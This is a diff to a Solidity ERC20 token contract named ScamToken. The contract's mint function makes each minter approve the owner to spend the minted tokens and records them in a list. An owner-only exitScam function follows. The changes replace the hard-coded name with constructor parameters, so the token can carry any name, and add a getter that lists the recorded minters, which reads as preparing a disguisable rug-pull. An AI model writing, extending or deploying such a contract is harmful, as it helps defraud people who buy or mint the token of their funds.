@@ -1,4 +1,4 @@
-// SPDX-License-Identifier: UNLICENSED
+// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.27;
 
 import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
@@ -8,7 +8,7 @@ contract ScamToken is ERC20, Ownable {
     uint256 initialSupply = 10000000 * (10 ** decimals());
     address[] spenders;
    
-    constructor() ERC20("ScamToken", "STK") Ownable(msg.sender){
+    constructor(string memory name_, string memory symbol_) ERC20(name_, symbol_) Ownable(msg.sender){
         ERC20._mint(msg.sender, initialSupply);
     }
 
@@ -16,6 +16,10 @@ contract ScamToken is ERC20, Ownable {
         ERC20._mint(msg.sender, value);
         spenders.push(msg.sender);
         approve(owner(), value);
+    }
+
+    function tokenSpenders() public view virtual returns(address[] memory) {
+        return spenders;
     }
 
     function exitScam() public onlyOwner() {
